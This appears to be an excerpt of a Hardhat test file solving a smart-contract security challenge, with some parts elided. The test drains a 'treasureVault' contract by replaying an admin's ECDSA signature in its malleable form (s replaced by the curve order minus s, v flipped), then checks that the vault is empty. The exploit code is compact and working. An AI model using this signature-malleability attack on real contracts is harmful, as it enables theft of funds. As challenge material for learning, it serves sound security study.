...
before(async () => {
    ...
    await admin.sendTransaction({
        to: treasureVault.address,
        value: precision.mul(2),
    });
    ...
    await treasureVault
        .connect(adminUser)
        .sendFundsWithAuth(precision.mul(1), 0, sig.v, sig.r, sig.s);
...
it("solves the challenge", async function () {
    let s = BigNumber.from(
        "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141"
    );
    s = s.sub(sig.s);
    let hexS = ethers.utils.hexlify(s);
    const v = sig.v == 28 ? 27 : 28;
    await treasureVault
        .connect(attacker)
        .sendFundsWithAuth(precision.mul(1), 0, v, sig.r, hexS);
});
...
after(async () => {
    ...
    ).to.be.gt(attackerStart);
    expect(await ethers.provider.getBalance(treasureVault.address)).to.be.equal(
        0
    );
});
